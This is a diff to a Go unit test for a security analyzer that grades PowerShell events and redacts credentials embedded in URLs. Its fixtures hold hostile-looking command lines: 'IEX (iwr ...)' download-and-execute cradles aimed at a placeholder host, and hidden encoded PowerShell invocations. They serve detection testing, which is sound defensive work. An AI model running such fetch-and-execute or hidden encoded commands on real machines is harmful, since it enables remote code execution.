@@ -42,6 +42,9 @@ func TestAnalyze_InvocationNoiseControlsAndReport(t *testing.T) {
 		{ID: "nested-host", EventType: model.EventPowerShellScript, CommandLine: `powershell.exe -w hidden -enc AAAA`},
 		{ID: "unsupported-host", EventType: model.EventProcessCreate, ProcessName: "powershell.exe", CommandLine: `powershell.exe -unknown -enc AAAA`},
 		{ID: "url-userinfo", EventType: model.EventPowerShellScript, CommandLine: `IEX (iwr 'https://alice:Dummy%40Secret%3A42@host01/a?q=x')`},
+		{ID: "url-apostrophe", EventType: model.EventPowerShellScript, CommandLine: `IEX (iwr "https://alice:Dummy'Secret42@host01/a")`},
+		{ID: "expandable-iex", EventType: model.EventPowerShellScript, CommandLine: `Write-Output "$(IEX $s)"`},
+		{ID: "expandable-host", EventType: model.EventPowerShellScript, CommandLine: `Write-Output "$(powershell.exe -w hidden -enc AAAA)"`},
 		{ID: "local-data", EventType: model.EventScheduledTaskCreate, ProcessName: "wscript.exe", CommandLine: `wscript.exe C:\Tools\audit.vbs C:\Temp\data.vbs`},
 	}
 	col := model.Collection{ID: "controls-collection", CaseID: c.ID, SourceType: model.SourceTypeLegacy, IngestionStatus: model.CollectionStatusPending}
@@ -122,8 +125,13 @@ func TestAnalyze_InvocationNoiseControlsAndReport(t *testing.T) {
 	if selected["nested-host"].Severity != "high" {
 		t.Fatal("nested host lost")
 	}
+	for _, id := range []string{"expandable-iex", "expandable-host"} {
+		if f := selected[id]; f.Severity != "low" || f.Confidence != "low" || !strings.Contains(f.Description, "uncertain") {
+			t.Fatal("expandable expression lost unresolved low/low lead")
+		}
+	}
 	for _, f := range fs {
-		if strings.Contains(f.Description, "Dummy%40Secret%3A42") {
+		if strings.Contains(f.Description, "Dummy%40Secret%3A42") || strings.Contains(f.Description, "Secret42") {
 			t.Fatal("URL userinfo leaked in findings")
 		}
 	}
@@ -144,20 +152,20 @@ func TestAnalyze_InvocationNoiseControlsAndReport(t *testing.T) {
 			t.Fatalf("report missing %q", s)
 		}
 	}
-	if strings.Contains(html, "DummySecret42") || strings.Contains(html, "Dummy%40Secret%3A42") {
+	if strings.Contains(html, "Secret42") || strings.Contains(html, "Dummy%40Secret%3A42") {
 		t.Fatal("report secret leak")
 	}
 	stored, err := svc.store.ListEvents(c.ID)
 	if err != nil || len(stored) != len(events) {
 		t.Fatalf("raw events changed: %d %v", len(stored), err)
 	}
-	original := false
-	for _, e := range stored {
-		if e.ID == "url-userinfo" {
-			original = strings.Contains(e.CommandLine, "Dummy%40Secret%3A42")
-		}
+	originals := make(map[string]string, len(events))
+	for _, e := range events {
+		originals[e.ID] = e.CommandLine
 	}
-	if !original {
-		t.Fatal("stored original command was destructively redacted")
+	for _, e := range stored {
+		if original, ok := originals[e.ID]; !ok || e.CommandLine != original {
+			t.Fatal("stored original command changed")
+		}
 	}
 }
